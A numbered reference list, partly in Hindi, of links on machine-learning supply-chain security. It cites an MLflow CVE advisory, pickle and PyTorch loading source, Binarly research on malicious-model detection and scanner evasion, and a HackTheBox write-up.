- [16] [Archive Slip bugs को high-value AI/ML bounties में बदलना](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk advisory और PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow source – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact download और upload endpoints](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer static-scanner evasion taxonomy](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer के ज़रिए malicious model का पता लगाना](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage `_load_from_bytes` implementation](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class` compatibility mapping](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` import mapping](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
